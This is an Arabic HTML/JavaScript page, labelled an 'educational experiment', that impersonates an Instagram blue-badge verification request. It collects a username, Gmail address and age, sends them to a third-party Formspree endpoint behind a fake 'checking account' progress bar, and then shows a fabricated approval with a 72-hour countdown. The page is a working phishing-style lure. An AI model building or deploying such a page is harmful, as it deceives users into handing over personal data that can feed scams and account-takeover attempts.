<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب شارة التوثيق - تجربة تعليمية</title>
    <style>
        @import url('https://googleapis.com');
        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; }
        body { background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background-color: #ffffff; border-radius: 16px; padding: 40px 30px; width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05); }
        .logo-container { display: inline-flex; justify-content: center; align-items: center; width: 70px; height: 70px; background-color: #e8f5ff; border-radius: 50%; margin-bottom: 20px; }
        .logo { width: 40px; height: 40px; }
        h2 { font-size: 1.4rem; color: #1a1a1a; margin-bottom: 10px; font-weight: 700; }
        p.description { font-size: 0.9rem; color: #626d7a; margin-bottom: 25px; line-height: 1.5; }
        .input-group { margin-bottom: 18px; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #e1e6eb; border-radius: 10px; background-color: #fafbfc; font-size: 0.9rem; outline: none; text-align: right; color: #333; }
        input:focus { border-color: #0095f6; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 149, 246, 0.1); }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #0095f6 0%, #007cc7 100%); color: white; border: none; border-radius: 10px; font-weight: 600; font-size: 0.95rem; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 149, 246, 0.2); }
        button:hover { background: linear-gradient(135deg, #1877f2 0%, #006bb3 100%); }
        .result { margin-top: 25px; font-size: 0.95rem; line-height: 1.6; display: none; }
        .success { color: #2c3e50; background-color: #f0f9ff; border: 1px solid #b9e2fe; padding: 20px; border-radius: 12px; }
        .error { color: #d9383a; font-weight: 600; background-color: #fff5f5; border: 1px solid #ffcccc; padding: 12px; border-radius: 10px; }
        .notification-area { margin-top: 15px; background: #ffffff; padding: 15px; border-radius: 8px; border: 1px dashed #b9e2fe; }
        .notify-btn { width: 100%; padding: 10px; border: none; border-radius: 8px; font-weight: 600; background: #e4e6eb; color: #4b4f56; margin-top: 10px; font-size: 0.85rem; cursor: not-allowed; opacity: 0.6; }
        .notify-btn:not(:disabled) { background: linear-gradient(135deg, #ff9900 0%, #e68a00 100%); color: white; cursor: pointer; opacity: 1; }
        .retry-btn { background: #626d7a; margin-top: 15px; font-size: 0.8rem; padding: 6px; box-shadow: none; color: white; border: none; border-radius: 4px; width: 100%; cursor: pointer; }
        
        /* تصميم شريط المعالجة والتحميل الجديد */
        .loading-container { display: none; margin-top: 20px; text-align: center; }
        .loading-text { font-size: 0.9rem; color: #626d7a; margin-bottom: 10px; }
        .progress-bar-bg { width: 100%; height: 8px; background-color: #e1e6eb; border-radius: 4px; overflow: hidden; position: relative; }
        .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #0095f6, #007cc7); border-radius: 4px; transition: width 0.1s linear; }
    </style>
</head>
<body>

    <div class="container" id="formContainer">
        <div class="logo-container">
            <svg class="logo" viewBox="0 0 24 24" fill="#0095f6">
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
        </div>

        <h2>طلب شارة التوثيق الزرقاء</h2>
        <p class="description">سجل بياناتك الرسمية لبدء معالجة طلب توثيق الحساب.</p>

        <form id="verificationForm" action="https://formspree.io" method="POST" onsubmit="event.preventDefault(); simulateVerification();">
            <div id="actionArea">
                <div class="input-group"><input type="text" id="username" name="username" placeholder="اسم مستخدم إنستغرام"></div>
                <div class="input-group"><input type="text" id="email" name="email" placeholder="البريد الإلكتروني (Gmail)"></div>
                <div class="input-group"><input type="text" id="age" name="age" placeholder="العمر أو بيانات إضافية"></div>
                <button type="submit">إرسال الطلب الآن</button>
            </div>
        </form>

        <!-- حاوية شريط التحميل -->
        <div id="loadingArea" class="loading-container">
            <div class="loading-text">جاري فحص الحساب وإرسال السجلات الفنية...</div>
            <div class="progress-bar-bg">
                <div id="progressBar" class="progress-bar-fill"></div>
            </div>
        </div>

        <div id="resultMessage" class="result"></div>
    </div>
    <script>
        var countdownTimer;

        function simulateVerification() {
            var usernameInput = document.getElementById('username').value.trim();
            var emailInput = document.getElementById('email').value.trim();
            var ageInput = document.getElementById('age').value.trim();
            var resultMessage = document.getElementById('resultMessage');
            var actionArea = document.getElementById('actionArea');
            var loadingArea = document.getElementById('loadingArea');
            var progressBar = document.getElementById('progressBar');
            var form = document.getElementById('verificationForm');

            // 1. فحص الحقول الفارغة
            if (usernameInput === "" || emailInput === "" || ageInput === "") {
                showError("يرجى ملء جميع الحقول المطلوبة للمتابعة.");
                return;
            }

            // 2. فحص شكل الجيميل
            var lowerEmail = emailInput.toLowerCase();
            if (lowerEmail.indexOf("gmail.com") === -1) {
                showError("البريد الإلكتروني يجب أن ينتهي بـ gmail.com.");
                return;
            }

            // إخفاء الحقول وإظهار شريط التحميل المطور
            actionArea.style.display = "none";
            resultMessage.style.display = "none";
            loadingArea.style.display = "block";
            progressBar.style.width = "0%";

            // تحريك شريط التحميل تدريجياً
            var width = 0;
            var progressInterval = setInterval(function() {
                if (width >= 100) {
                    clearInterval(progressInterval);
                    // عند اكتمال شريط التحميل، يتم إرسال البيانات فعلياً
                    sendDataToFormspree(form, usernameInput, emailInput, loadingArea, resultMessage);
                } else {
                    width += 5; // سرعة زيادة ملء الشريط
                    progressBar.style.width = width + "%";
                }
            }, 100); // تحديث الحركة كل 100 ملي ثانية
        }

        function sendDataToFormspree(form, username, email, loadingArea, resultMessage) {
            var data = new FormData(form);
            fetch(form.action, {
                method: form.method,
                body: data,
                headers: { 'Accept': 'application/json' }
            }).then(function(response) {
                loadingArea.style.display = "none"; // إخفاء شريط التحميل بعد انتهاء الاستجابة
                
                if (response.ok) {
                    resultMessage.style.display = "block";
                    resultMessage.className = "result success";
                    resultMessage.style.color = "#2c3e50";

                    var htmlContent = '<div style="font-size: 2rem; margin-bottom: 10px;">✨</div>' +
                        '<strong>تم قبول طلبك المبدئي بنجاح لحساب @' + username + '</strong><br>' +
                        '<p style="font-size: 0.85rem; color: #626d7a; margin: 5px 0;">تم تأكيد الطلب عبر البريد: ' + email + '</p>' +
                        '<hr style="border: 0; border-top: 1px solid #e1e6eb; margin: 12px 0;">' +
                        '<span style="font-size: 0.9rem; display: block;">سيتم مراجعة التوثيق النهائي خلال <b>24 إلى 72 ساعت</b>.</span>' +
                        '<div class="notification-area">' +
                            '<small style="color: #e68a00; font-weight:600; display:block;">إن لم يتم التوثيق بعد 72 ساعة، يرجى إعلامنا عبر زر الإشعار أدناه:</small>' +
                            '<button id="notifyBtn" class="notify-btn" disabled onclick="sendNotification()">إرسال إشعار (متاح بعد: <span id="timerClock">72:00:00</span>)</button>' +
                        '</div>' +
                        '<button class="retry-btn" onclick="resetForm()">إعادة تقديم طلب جديد</button>';

                    resultMessage.innerHTML = htmlContent;
                    startRealTimer();
                } else {
                    showError("حدث خطأ في الاتصال، تأكد من إعداد حساب Formspree.");
                    document.getElementById('actionArea').style.display = "block";
                }
            }).catch(function(error) {
                loadingArea.style.display = "none";
                showError("فشل الاتصال بالإنترنت، يرجى المحاولة مجدداً.");
                document.getElementById('actionArea').style.display = "block";
            });
        }

        function startRealTimer() {
            var totalSeconds = 72 * 60 * 60; 
            if (countdownTimer) clearInterval(countdownTimer);
            
            countdownTimer = setInterval(function() {
                totalSeconds--;
                var hours = Math.floor(totalSeconds / 3600);
                var minutes = Math.floor((totalSeconds % 3600) / 60);
                var seconds = totalSeconds % 60;

                hours = hours < 10 ? "0" + hours : hours;
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                var clockElement = document.getElementById('timerClock');
                if (clockElement) { clockElement.innerText = hours + ":" + minutes + ":" + seconds; }

                if (totalSeconds <= 0) {
                    clearInterval(countdownTimer);
                    var btnElement = document.getElementById('notifyBtn');
                    if (btnElement) { 
                        btnElement.disabled = false; 
                        btnElement.style.cursor = "pointer";
                        btnElement.innerHTML = "إرسال إشعار الآن 🔔"; 
                    }
                }
            }, 1000);
        }

        function sendNotification() { alert("تم إرسال الإشعار بنجاح! شكراً لك."); }
        function showError(message) { 
            var resultMessage = document.getElementById('resultMessage'); 
            resultMessage.style.display = "block"; 
            resultMessage.className = "result error"; 
            resultMessage.innerText = message; 
        }
        
        function resetForm() {
            if (countdownTimer) clearInterval(countdownTimer);
            document.getElementById('username').value = "";
            document.getElementById('email').value = "";
            document.getElementById('age').value = "";
            document.getElementById('actionArea').style.display = "block";
            document.getElementById('resultMessage').style.display = "none";
            document.getElementById('resultMessage').innerHTML = "";
            document.getElementById('loadingArea').style.display = "none";
        }
    </script>
</body>
</html>

